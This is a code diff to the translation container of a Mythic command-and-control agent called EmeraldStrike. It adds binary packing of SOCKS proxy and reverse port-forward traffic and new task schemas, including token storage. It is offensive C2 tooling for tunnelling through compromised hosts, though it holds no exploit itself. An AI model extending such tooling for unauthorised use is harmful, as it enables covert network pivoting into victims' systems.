@@ -27,6 +27,9 @@ TLV_TYPE_INTEGRITY = 0x16
 TLV_TYPE_EXT_IP    = 0x17
 TLV_TYPE_PROCNAME  = 0x18
 TLV_TYPE_OS_INFO   = 0x19
+TLV_TYPE_DELEGATES = 0x1B
+TLV_TYPE_SOCKS     = 0x20
+TLV_TYPE_RPFWD     = 0x21
 
 # Task id -> agent-registered file_id, shared between the translator (which sees
 # the file_id Mythic returns in get_tasking responses) and the payload container
@@ -187,7 +190,107 @@ _CMD_SCHEMAS = {
     "dns":              [("host", "string")],
     "tasks":            [],
     "argue":             [("action", "string"), ("fake_args", "string")],
+    "token_store":       [("action", "string"), ("id", "int32")],
+    "socks":             [("action", "string")],
+    "rportfwd":          [("action", "string"), ("bind_port", "int32")],
 }
+
+
+def _pack_socks_entries(socks_list):
+    """Pack a list of Mythic SOCKS entries into binary TLV_SOCKS payload.
+    Each entry: {server_id: int, data: base64_str, exit: bool}
+    Wire format: [count:4] [server_id:4 exit:1 data_len:4 data:var] ...
+    """
+    if not socks_list:
+        return b""
+    count = len(socks_list)
+    buf = struct.pack(">I", count)
+    for entry in socks_list:
+        server_id = int(entry.get("server_id", 0))
+        is_exit = 1 if entry.get("exit", False) else 0
+        data_b64 = entry.get("data", "")
+        data = base64.b64decode(data_b64) if data_b64 else b""
+        buf += struct.pack(">IBI", server_id, is_exit, len(data))
+        buf += data
+    return buf
+
+
+def _unpack_socks_entries(raw):
+    """Unpack binary TLV_SOCKS payload into Mythic SOCKS JSON entries.
+    Returns a list of {server_id, data (base64), exit} dicts.
+    """
+    entries = []
+    if len(raw) < 4:
+        return entries
+    count = struct.unpack(">I", raw[:4])[0]
+    pos = 4
+    for _ in range(count):
+        if pos + 9 > len(raw):
+            break
+        server_id = struct.unpack(">I", raw[pos:pos+4])[0]
+        pos += 4
+        is_exit = raw[pos] != 0
+        pos += 1
+        data_len = struct.unpack(">I", raw[pos:pos+4])[0]
+        pos += 4
+        if pos + data_len > len(raw):
+            break
+        data = raw[pos:pos+data_len]
+        pos += data_len
+        entries.append({
+            "server_id": server_id,
+            "data": base64.b64encode(data).decode() if data else "",
+            "exit": is_exit,
+        })
+    return entries
+
+
+def _pack_rpfwd_entries(rpfwd_list):
+    """Pack a list of Mythic rpfwd entries into binary TLV_RPFWD payload.
+    Same wire format as SOCKS: [count:4] [server_id:4 exit:1 data_len:4 data:var] ...
+    """
+    if not rpfwd_list:
+        return b""
+    count = len(rpfwd_list)
+    buf = struct.pack(">I", count)
+    for entry in rpfwd_list:
+        server_id = int(entry.get("server_id", 0))
+        is_exit = 1 if entry.get("exit", False) else 0
+        data_b64 = entry.get("data", "")
+        data = base64.b64decode(data_b64) if data_b64 else b""
+        buf += struct.pack(">IBI", server_id, is_exit, len(data))
+        buf += data
+    return buf
+
+
+def _unpack_rpfwd_entries(raw):
+    """Unpack binary TLV_RPFWD payload into Mythic rpfwd JSON entries.
+    Returns a list of {server_id, data (base64), exit} dicts.
+    """
+    entries = []
+    if len(raw) < 4:
+        return entries
+    count = struct.unpack(">I", raw[:4])[0]
+    pos = 4
+    for _ in range(count):
+        if pos + 9 > len(raw):
+            break
+        server_id = struct.unpack(">I", raw[pos:pos+4])[0]
+        pos += 4
+        is_exit = raw[pos] != 0
+        pos += 1
+        data_len = struct.unpack(">I", raw[pos:pos+4])[0]
+        pos += 4
+        if pos + data_len > len(raw):
+            break
+        data = raw[pos:pos+data_len]
+        pos += data_len
+        entries.append({
+            "server_id": server_id,
+            "data": base64.b64encode(data).decode() if data else "",
+            "exit": is_exit,
+        })
+    return entries
 
 
 def _pack_params(command, params):
@@ -254,24 +357,36 @@ class EmeraldStrikeTranslator(TranslationContainer):
 
             buf = b""
             action = msg.get("action", "")
-            if action == "get_tasking" and "tasks" in msg and msg["tasks"]:
-                # Pack EVERY queued task as its own TLV_COMMAND/TLV_TASKID/
-                # TLV_DATA triple. Mythic delivers the full queue in one
-                # get_tasking reply; packing only tasks[0] left the rest marked
-                # delivered server-side but never executed (stuck "agent
-                # processing" forever). The agent iterates all TLVs.
-                for task in msg["tasks"]:
-                    command = task.get("command", "")
-                    buf += _pack_tlv(TLV_TYPE_COMMAND, command)
-                    buf += _pack_tlv(TLV_TYPE_TASKID, task.get("id", ""))
-                    params = task.get("parameters", "")
-                    if isinstance(params, str):
-                        try:
-                            params = json.loads(params)
-                        except Exception:
-                            pass
-                    params_packed = _pack_params(command, params) if isinstance(params, dict) else b""
-                    buf += _pack_tlv(TLV_TYPE_DATA, params_packed)
+            if action == "get_tasking":
+                # Pack task TLV triples if present
+                if "tasks" in msg and msg["tasks"]:
+                    for task in msg["tasks"]:
+                        command = task.get("command", "")
+                        buf += _pack_tlv(TLV_TYPE_COMMAND, command)
+                        buf += _pack_tlv(TLV_TYPE_TASKID, task.get("id", ""))
+                        params = task.get("parameters", "")
+                        if isinstance(params, str):
+                            try:
+                                params = json.loads(params)
+                            except Exception:
+                                pass
+                        params_packed = _pack_params(command, params) if isinstance(params, dict) else b""
+                        buf += _pack_tlv(TLV_TYPE_DATA, params_packed)
+
+                # Pack SOCKS entries as TLV_SOCKS if present
+                socks_list = msg.get("socks")
+                if socks_list:
+                    socks_payload = _pack_socks_entries(socks_list)
+                    if socks_payload:
+                        buf += _pack_tlv(TLV_TYPE_SOCKS, socks_payload)
+
+                # Pack rpfwd entries as TLV_RPFWD if present
+                rpfwd_list = msg.get("rpfwd")
+                if rpfwd_list:
+                    rpfwd_payload = _pack_rpfwd_entries(rpfwd_list)
+                    if rpfwd_payload:
+                        buf += _pack_tlv(TLV_TYPE_RPFWD, rpfwd_payload)
+
             elif action == "checkin":
                 if "id" in msg:
                     buf += _pack_tlv(TLV_TYPE_TASKID, msg["id"])
@@ -359,6 +474,18 @@ class EmeraldStrikeTranslator(TranslationContainer):
                     # The old value of 1 serialized the queue one-task-per-
                     # checkin; bursts left tasks stuck server-side forever.
                     msg["tasking_size"] = 10
+
+            # Unpack SOCKS upstream data from agent (TLV_SOCKS -> JSON socks list)
+            if TLV_TYPE_SOCKS in tlvs:
+                socks_entries = _unpack_socks_entries(tlvs[TLV_TYPE_SOCKS])
+                if socks_entries:
+                    msg["socks"] = socks_entries
+
+            # Unpack rpfwd upstream data from agent (TLV_RPFWD -> JSON rpfwd list)
+            if TLV_TYPE_RPFWD in tlvs:
+                rpfwd_entries = _unpack_rpfwd_entries(tlvs[TLV_TYPE_RPFWD])
+                if rpfwd_entries:
+                    msg["rpfwd"] = rpfwd_entries
 
             if TLV_TYPE_TASKID in tlvs:
                 msg["id"] = tlvs[TLV_TYPE_TASKID].decode("utf-8")
